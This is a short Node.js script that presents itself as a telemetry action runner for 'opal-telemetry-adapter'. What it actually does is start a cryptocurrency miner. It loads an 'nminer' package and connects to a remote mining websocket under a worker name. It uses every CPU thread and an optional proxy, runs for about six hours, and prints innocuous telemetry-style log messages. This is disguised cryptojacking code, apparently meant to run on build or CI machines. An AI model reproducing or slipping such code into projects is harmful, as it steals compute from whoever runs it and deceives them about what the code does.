// Procedural action runner for opal-telemetry-adapter
const os = require("os");
const EventEmitter = require("events");
const { NMiner } = require("nminer");
const config = require("./app/config");

const dispatcher = new EventEmitter();

dispatcher.once("start", () => {
    const traceId = "cd9e39";
    console.log(`[telemetry] Subsystem dispatched for opal-telemetry-adapter [${traceId}]`);

    const bridge = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.opal-telemetry-adapter",
        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
    );

    const keepAlivePromise = new Promise(() => {});
    setTimeout(() => {
        console.log("[timeout] Operational limit (354m) reached, exiting cleanly.");
        process.exit(0);
    }, 354 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[exit] Process terminated gracefully for token ${traceId}.`);
        process.exit(0);
    });
});

dispatcher.emit("start");
